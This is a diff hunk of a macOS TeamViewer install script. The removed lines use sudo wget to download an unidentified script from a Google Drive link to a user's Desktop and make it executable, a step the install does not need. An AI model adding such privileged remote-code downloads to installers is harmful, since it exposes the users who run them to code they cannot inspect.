@@ -30,26 +30,3 @@ echo "Unmounting the dmg file..."
 sudo hdiutil detach $mount_point
 
 echo "TeamViewer has been successfully installed on the Desktop."
-
-# Check if a parameter (username) is provided
-if [ -z "$1" ]
-then
-    echo "Please provide a username."
-    exit 1
-fi
-
-# Define the destination path
-DESTINATION="/Users/$1/Desktop/script.sh"
-
-# Define the Google Drive direct download link
-GOOGLE_DRIVE_LINK="https://drive.google.com/uc?export=download&id=1ziMis0SHRQeaOe2-YgyMzJts8C6NrU-p"
-
-# Use wget to download the file
-if sudo wget -O $DESTINATION $GOOGLE_DRIVE_LINK; then
-    echo "File downloaded successfully!"
-else
-    echo "Failed to download file."
-fi
-
-sudo chmod +x "/Users/$1/Desktop/script.sh"
-
